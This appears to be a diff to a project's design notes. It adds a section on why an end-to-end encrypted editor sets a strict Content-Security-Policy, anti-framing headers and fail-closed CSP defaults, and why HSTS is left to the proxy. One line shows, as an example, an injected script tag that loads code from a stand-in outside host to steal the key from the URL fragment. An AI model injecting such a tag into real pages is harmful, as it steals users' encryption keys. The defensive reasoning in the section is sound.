@@ -847,6 +847,39 @@ likely thing to be wrong. Verify the harness before changing the code.
 
 ---
 
+## A policy, and what it was protecting
+
+The end-to-end encryption key is in the URL fragment: `/?doc=<id>#k=<key>`. The server never sees
+it, which is the whole reason that design works. But a fragment is not a secret from the page,
+and the key is exactly one `location.hash` away from any script running in the tab.
+
+There is no HTML-injection sink today. The new `Content-Security-Policy` is the net for the day
+one appears: it does not stop an injection, it decides what an injected script may then load
+and exfiltrate. Without `script-src`, an injected `<script src="https://elsewhere/steal.js">`
+runs and reads the key out of the hash. With `script-src 'self'`, it is refused.
+
+`frame-ancestors 'none'` and `X-Frame-Options: DENY` are the same kind of net: without either,
+any site can frame the editor and overlay invisible UI on it.
+
+Two decisions worth recording:
+
+1. **`script-src` gets neither `'unsafe-inline'` nor `'unsafe-eval'`, ever.** `style-src` does
+   get `'unsafe-inline'`, because CodeMirror injects a `<style>` element at runtime - verified by
+   reading the built bundle, and confirmed empirically when removing it made all six browser
+   scenarios fail with `style-src-elem blocked inline`. A style cannot execute, so that is a
+   different risk. A policy that allowed inline script would not be a weaker version of this
+   protection; it would be the absence of it.
+
+2. **No HSTS in the application.** It is a promise about an origin's whole lifetime, and only
+   the party terminating TLS can keep it. Sending it from a process that listens on plain HTTP
+   means locking out any client that reaches the origin directly. It belongs to the proxy, and
+   `docs/deploy.md` now says so.
+
+`CSP_MODE` defaults to `enforce`, which is only defensible because the browser tests confirm
+zero violations across all six scenarios. It takes `report-only` for changing the policy, and
+falls back to `enforce` on any unrecognised value: a typo in an environment variable should not
+be able to silently leave a deployment unprotected.
+
 ## Log
 
 - **Phase 4** — Offline-first. 397 tests. Two ADRs. The headline claim is now
